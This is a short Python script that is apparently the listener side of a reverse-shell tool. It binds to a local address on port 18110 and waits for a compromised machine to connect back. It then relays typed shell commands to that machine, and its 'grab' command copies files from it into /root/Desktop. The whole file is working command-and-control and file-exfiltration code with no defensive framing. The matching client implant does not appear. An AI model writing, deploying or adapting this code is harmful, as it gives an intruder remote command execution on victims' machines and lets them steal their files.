import socket
import os

def transfer(conn,command):
    conn.send(command.encode())
    fpath = command.split(" * ")[1]
    fname = str(fpath).split("\\")[-1:][0].split("'")[0]
    f = open('/root/Desktop/{0}'.format(fname),'wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find the file.'.encode() in bits:
            print('[-] Unable to find the file')
            break
        if bits.endswith('DONE'.encode()):
            print('[+] Transfer completed ')
            f.close()
            break
        f.write(bits)

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("192.168.0.10", 18110))
    s.listen(1)
    print("[+] Listening for incoming TCP connections on port 18110...")
    conn, addr = s.accept()
    print("[+] We got a connection from: ", addr)

    while True:
        command = input("Shell> ")

        if "terminate" in command:
            conn.send("terminate".encode())
            conn.close()
            break
        elif "grab" in command:
            transfer(conn,command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    connect()

main()
